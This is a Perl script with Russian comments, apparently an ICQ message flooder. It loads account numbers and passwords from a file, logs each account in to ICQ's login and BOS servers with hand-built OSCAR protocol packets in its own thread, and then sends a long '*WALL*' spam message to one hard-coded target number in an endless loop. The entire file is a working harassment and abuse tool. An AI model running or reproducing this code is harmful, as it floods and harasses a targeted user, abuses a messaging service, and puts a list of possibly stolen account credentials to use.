#!/usr/bin/perl
use warnings;
use strict;
use threads;
use threads::shared;
use Socket;

my $targetUin = 175297376; #кого
my $message = '*WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL* *WALL*' ; #чем
my ($host,$port) = ('login.icq.com', 5190);
my @uins : shared;
open(FILE, '<uins.txt');
@uins = <FILE>;
close(FILE);
chomp(@uins);
my $threads = scalar @uins; #количество потоков = количеству асек в файле
my @thread;
for(1..$threads) { $thread[$_] = threads->create(\&flood); sleep 3 }
for(1..$threads) { $thread[$_]->join; }

sub flood {
  my ($uin,$password) = split(/;/,shift(@uins));
  my $SNAC = "\x00\x00\x00\x01\x00\x01".int2bytes(length($uin)).$uin."\x00\x02".int2bytes(length($password)).
  substr($password^"\xF3\x26\x81\xC4\x39\x86\xDB\x92\x71\xA3\xB9\xE6\x53\x7A\x95\x7C",0,length($password)).
  "\x00\x03\x00\x08\x49\x43\x51\x42\x61\x73\x69\x63\x00\x16\x00\x02\x01\x0A\x00".
  "\x17\x00\x02\x00\x14\x00\x18\x00\x02\x00\x22\x00\x19\x00\x02\x00\x00\x00\x1A".
  "\x00\x02\x09\x11\x00\x14\x00\x04\x00\x00\x04\x3D\x00\x0F\x00\x02\x65\x6E\x00".
  "\x0E\x00\x02\x75\x73";
  my $FLAP = "\x2A\x01".seqNum().int2bytes(length($SNAC));
  socket(SOCKET,AF_INET,SOCK_STREAM,getprotobyname('tcp'));
  connect(SOCKET,sockaddr_in($port,inet_aton($host)));
  my $response;
  sysread(SOCKET,$response,10);
  syswrite(SOCKET,$FLAP.$SNAC);
  sysread(SOCKET,$response,65535);
  close(SOCKET);

  if($response=~/MISMATCH_PASSWD/) { return }
  my ($BOS_Host, $BOS_Port, $Cookie);
  if(($BOS_Host, $BOS_Port) = $response =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})/o) {
  $Cookie = parsCookie($response);
  print "[+] $uin reconnect to: $BOS_Host:$BOS_Port\n"
  } else { return }
  $SNAC = "\x00\x00\x00\x01\x00\x06\x01\x00".$Cookie;
  $FLAP = "\x2A\x01".seqNum().int2bytes(length($SNAC));

  socket(SOCKET,AF_INET,SOCK_STREAM,getprotobyname('tcp'));
  connect(SOCKET,sockaddr_in($BOS_Port,inet_aton($BOS_Host)));
  sysread(SOCKET,$response,10);
  syswrite(SOCKET,$FLAP.$SNAC);
  sysread(SOCKET,$response,65535);

  $SNAC = "\x00\x01\x00\x02\x00\x00\x00\x00\x00\x01\x00\x01\x00\x03\x01\x10\x02\x8A\x00\x02".
  "\x00\x01\x01\x10\x02\x8A\x00\x03\x00\x01\x01\x10\x02\x8A\x00\x15".
  "\x00\x01\x01\x10\x02\x8A\x00\x04\x00\x01\x01\x10\x02\x8A\x00\x06".
  "\x00\x01\x01\x10\x02\x8A\x00\x09\x00\x01\x01\x10\x02\x8A\x00\x0A".
  "\x00\x01\x01\x10\x02\x8A";
  $FLAP = "\x2A\x02".seqNum().int2bytes(length($SNAC));

  syswrite(SOCKET,$FLAP.$SNAC);

  for(;;) {
  $SNAC = "\x00\x04\x00\x06\x00\x00\x00\x00\x00\x02\x1D\x91\xEF\x52\xEA\x92\xD3\x3F\x00\x02".
  pack('h',length($targetUin)).$targetUin."\x00\x05".int2bytes(length($message)+102).
  "\x00\x00".
  "\x1D\x91\xEF\x52\xEA\x92\xD3\x3F\x09\x46\x13\x49\x4C\x7F\x11\xD1\x82\x22\x44\x45\x53\x54\x00\x00".
  "\x00\x0A\x00\x02\x00\x01\x00\x0F".
  "\x00\x00\x27\x11". #хз
  int2bytes(length($message)+62). #61 + длина текста
  "\x1B\x00\x08".("\x00"x19).
  "\x03\x00\x00\x00".
  "\x00\x02\x00\x0E\x00\x02".("\x00"x13).
  "\x01\x00\x00\x00\x00".
  "\x01".pack('v',length("$message\0")).$message."\x00\x00\x00\x00\x00\xFF\xFF\xFF\x00";
  $FLAP = "\x2A\x02".seqNum().int2bytes(length($SNAC));
  syswrite(SOCKET,$FLAP.$SNAC);
  sleep 2+int(rand(3));
  print "$uin send message\n"
  }

}

sub int2bytes { return pack('n',shift) } #пакуем в 16битное целое

sub parsCookie { #парсер куки
  my $cookie = shift;
  my $i++;
  for(;;$i++) { last if substr($cookie,$i,4) eq "\x00\x06\x01\x00" }
  return substr($cookie,4+$i,256)
}

BEGIN { #счётчик номера пакета
  my $seqNum = int(rand(65535));
  sub seqNum {
  $seqNum++;
  $seqNum = 0 if $seqNum > 65535;
  return int2bytes($seqNum)
  }
}

